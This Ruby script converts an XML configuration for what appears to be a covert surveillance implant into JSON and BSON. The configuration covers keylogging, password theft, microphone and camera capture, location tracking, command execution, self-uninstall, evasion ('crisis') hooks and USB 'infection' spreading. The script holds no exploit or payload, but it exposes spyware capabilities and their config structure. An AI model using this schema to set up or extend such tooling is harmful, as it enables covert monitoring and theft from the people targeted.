#! /usr/bin/env ruby

require 'json'
require 'bson'
require 'pp'
require 'xmlsimple'

    def parse_globals(items)
      globals = {}
      items.each_pair do |key, value|
        if key == 'quota' then
          globals[:quota] = {:min => value.first['mindisk'], :max => value.first['maxlog']}
          globals[:wipe] = value.first['wipe'] == 'false' ? false : true
        end
        if key == 'template' then
          globals[:type] = value.first['type']
        end
      end
      globals[:migrated] = true
      globals[:version] = 20111231
      globals[:nohide] = []

      return globals
    end

    def parse_events(items)
      events = []

      return events if items.nil?

      items.each do |item|
        e = {}
        e[:start] = item['action'].to_i
        e[:enabled] = true
        #e[:repeat] = -1
        #e[:end] = -1
        (item.keys.delete_if {|x| x == 'action' or x == 'actiondesc'}).each do |ev|
          e[:event] = ev
          e[:desc] = ev
          params = item[ev].first
          e[:end] = params['endaction'].to_i unless params['endaction'].nil? or params['endaction'].to_i == -1
          case ev
            when 'process'
              e[:window] = params['window'] == 'false' ? false : true
              e[:focus] = params['focus'] == 'false' ? false : true
              e[:process] = params['content']
            when 'simchange', 'ac', 'standby', 'screensaver'
              # no parameters
            when 'connection'
              e.merge! params
              e['port'] = e['port'].to_i
            when 'connectivity'
              # rename to connection
              e[:event] = 'connection'
            when 'winevent'
              e.merge! params
              e['id'] = e['id'].to_i
            when 'battery'
              e[:min] = params['min'].to_i
              e[:max] = params['max'].to_i
            when 'call'
              e[:number] = params['number']
            when 'quota'
              e[:quota] = params['size'].to_i
            when 'location'
              e[:event] = 'position'
              e[:type] = params['type']
              e[:latitude] = params['latitude'].to_f unless params['latitude'].nil?
              e[:longitude] = params['longitude'].to_f unless params['longitude'].nil?
              e[:distance] = params['distance'].to_i unless params['distance'].nil?
              e[:id] = params['id'].to_i unless params['id'].nil?
              e[:country] = params['country'].to_i unless params['country'].nil?
              e[:network] = params['network'].to_i unless params['network'].nil?
              e[:area] = params['area'].to_i unless params['area'].nil?
            when 'sms'
              e[:number] = params['number']
              e[:text] = params['text']
            when 'timer'
              case params['type']
                when 'date'
                  e[:event] = 'date'
                  e[:datefrom] = params['content']
                when 'daily'
                  e[:ts] = "%02d:%02d:%02d" % [params['hour'].first.to_i, params['minute'].first.to_i, params['second'].first.to_i]
                  e[:te] = "%02d:%02d:%02d" % [params['endhour'].first.to_i, params['endminute'].first.to_i, params['endsecond'].first.to_i]
                when 'loop'
                  e[:event] = 'timer'
                  e[:ts] = "00:00:00"
                  e[:te] = "23:59:59"
                  e[:repeat] = e[:start]
                  e[:delay] = params['hour'].first.to_i * 3600 + params['minute'].first.to_i * 60 + params['second'].first.to_i
                when 'after startup'
                  e[:event] = 'timer'
                  e[:ts] = "00:00:00"
                  e[:te] = "23:59:59"
                when 'after install'
                  e[:event] = 'afterinst'
                  e[:days] = params['day'].first.to_i
              end
            else
              raise 'unknown event: ' + ev
          end
        end
        events << e
      end

      return events
    end

    def parse_actions(items)
      actions = []

      return actions if items.nil?

      items.each do |item|
        a = {}
        a[:desc] = item['description']
        a[:subactions] = []
        # each subaction
        (item.keys.delete_if {|x| x == 'number' or x == 'description'}).each do |sub|
          item[sub].each do |s|

            subaction = {:action => sub}

            case sub
              when 'synchronize'
                subaction[:stop] = false
                # bluetooth does not exist anymore
                next if s['type'] == 'bluetooth'
                subaction.merge! s
                subaction.delete('type')
                subaction.delete('gprs')
                subaction['wifi'] = false unless s.has_key?('wifi')
                subaction['wifi'] = s['wifi'] == 'true' ? true : false
                subaction['cell'] = s['gprs'] == 'true' ? true : false
                subaction['cell'] = true if s.has_key?('apn')
              when 'sms'
                subaction.merge! s
              when 'log'
                subaction[:text] = s
              when 'execute'
                subaction[:command] = s
              when 'uninstall'
                # no parameters
              when 'agent'
                subaction[:action] = 'module'
                subaction[:status] = s['action']
                subaction[:module] = s['name']
              else
                raise "unknown subaction: " + sub
            end
            a[:subactions] << subaction
          end
        end
        actions << a
      end

      return actions
    end

    def parse_agents(items)
      modules = []

      return modules if items.nil?

      items.each do |item|
        a = {}
        a[:module] = (item.keys.delete_if {|x| x == 'enabled'}).first
        a[:enabled] = item['enabled'] == 'false' ? false : true
        case a[:module]
          when 'application', 'chat', 'clipboard', 'device', 'keylog', 'password', 'calllist', 'url'
            # no parameters
          when 'call', 'camera', 'mouse', 'print', 'conference', 'livemic'
            a.merge! item[a[:module]].first
          when 'snapshot'
            a.merge! item[a[:module]].first
            a['onlywindow'] = a['onlywindow'] == 'true' ? true : false
          when 'mic'
            a.merge! item[a[:module]].first
            a['autosense'] = a['autosense'] == 'true' ? true : false
            a['vad'] = a['vad'] == 'true' ? true : false
          when 'position'
            a.merge! item[a[:module]].first
            a['gps'] = a['gps'] == 'true' ? true : false
            a['wifi'] = a['wifi'] == 'true' ? true : false
            a['cell'] = a['cell'] == 'true' ? true : false
          when 'crisis'
            t = item[a[:module]].first
            a[:network] = {:enabled => t['network'].first['enabled'] == 'false' ? false : true,
                           :processes => t['network'].first['process']} unless a[:network].nil?
            a[:hook] = {:enabled => t['hook'].first['enabled'] == 'false' ? false : true,
                        :processes => t['hook'].first['process']} unless a[:hook].nil?
            a[:synchronize] = t['synchronize'] == 'false' ? false : true unless t['synchronize'].nil?
            a[:call] = t['call'] == 'false' ? false : true unless t['call'].nil?
            a[:mic] = t['mic'] == 'false' ? false : true unless t['mic'].nil?
            a[:camera] = t['camera'] == 'false' ? false : true unless t['camera'].nil?
            a[:position] = t['position'] == 'false' ? false : true unless t['position'].nil?
          when 'infection'
            t = item[a[:module]].first
            a[:local] = t['local'] == 'false' ? false : true
            a[:usb] = t['usb'] == 'false' ? false : true
            # false by default on purpose
            a[:mobile] = false
          when 'file'
            a.merge! item[a[:module]].first
            a['accept'] = a['accept'].first['mask'] unless a['accept'].nil?
            a['deny'] = a['deny'].first['mask'] unless a['deny'].nil?
            a['open'] = a['open'] == 'true' ? true : false
            a['capture'] = a['capture'] == 'true' ? true : false
          when 'messages'
            item[a[:module]].each do |mes|
              a.merge! mes
            end
            unless a['sms'].nil?
              a['sms'] = a['sms'].first
              a['sms']['enabled'] = a['sms']['enabled'] == 'true' ? true : false
              a['sms']['filter'][0]['history'] = a['sms']['filter'][0]['history'] == 'true' ? true : false
            end
            unless a['mms'].nil?
              a['mms'] = a['mms'].first
              a['mms']['enabled'] = a['mms']['enabled'] == 'true' ? true : false
              a['mms']['filter'][0]['history'] = a['mms']['filter'][0]['history'] == 'true' ? true : false
            end
            unless a['mail'].nil?
              a['mail'] = a['mail'].first
              a['mail']['enabled'] = a['mail']['enabled'] == 'true' ? true : false
              a['mail']['filter'][0]['history'] = a['mail']['filter'][0]['history'] == 'true' ? true : false
            end

          when 'organizer'
            # we need to split this agent in two
            a[:module] = 'addressbook'
            modules << a.dup
            a[:module] = 'calendar'
          else
            raise "unknown agent: " + a[:module]
        end
        modules << a
      end

      return modules
    end

    def agents_on_startup(modules, actions, events)

      subactions = []
          
      modules.each do |m|
        subactions << {:action => 'module', :status => 'start', :module => m[:module]} if m[:enabled]
        m.delete(:enabled)
      end

      start_action = {:desc => 'STARTUP', :subactions => subactions}

      actions << start_action

      event = {:event => 'timer', :desc => 'On Startup', :enabled => true,
               :ts => '00:00:00', :te => '23:59:59',
               :start => actions.size - 1}

      events << event
    end

    def agents_with_repetition(modules, actions, events)
      modules.each do |m|
        if m.has_key?('interval')
          action = {:desc => "#{m[:module]} iteration", :subactions => [{:action => 'module', :status => 'start', :module => m[:module]}] }
          actions << action
          event = {:event => 'timer', :desc => "#{m[:module]} loop", :enabled => true,
                   :ts => '00:00:00', :te => '23:59:59',
                   :repeat => actions.size - 1, :delay => m['interval']}
          if m.has_key?('iterations')
            event[:iter] = m['iterations']
            m.delete('iterations')
          end
          events << event
          m.delete('interval')
          if m[:module] == 'snapshot'
            if m['newwindow']
              event = {:event => 'window', :desc => "new win #{m[:module]}", :enabled => true, :start => actions.size - 1}
              events << event
            end
            m.delete('newwindow')
          end
        end
      end
    end

    def xml_to_json(content)

      modules = []
      actions = []
      events = []
      globals = {}

      begin
        xml_config = XmlSimple.xml_in(content)

        xml_config.each do |section|
          case section[0]
            when 'globals'
              globals = parse_globals(section[1].first)
            when 'events'
              events = parse_events(section[1].first['event'])
            when 'actions'
              actions = parse_actions(section[1].first['action'])
            when 'agents'
              modules = parse_agents(section[1].first['agent'])
          end
        end
      rescue Exception => e
        puts "Invalid config parsing: " + e.message
        puts "EXCEPTION: " + e.backtrace.join("\n")
      end

      agents_on_startup(modules, actions, events)
      agents_with_repetition(modules, actions, events)

      config = {'modules' => modules, 'actions' => actions, 'events' => events, 'globals' => globals}

      return config.to_json
    end

#filename = 'config_mobile'
filename = 'config_desktop'
content = ''

File.open("#{filename}.xml", 'rb') do |f|
  content = f.read
end

json_config = xml_to_json(content)
config = JSON.parse(json_config)

#puts
#puts "CONFIG: "
pp config

File.open("#{filename}.json", 'wb') do |f|
  f.write json_config
end

bconfig = BSON.serialize(config)

File.open("#{filename}.bson", 'wb') do |f|
  f.write bconfig
end

puts "\n\nBSON CONFIG: [#{bconfig.size}]"
#bconfig.to_a.each do |c|
#  print "%02X" % c
#end
puts 
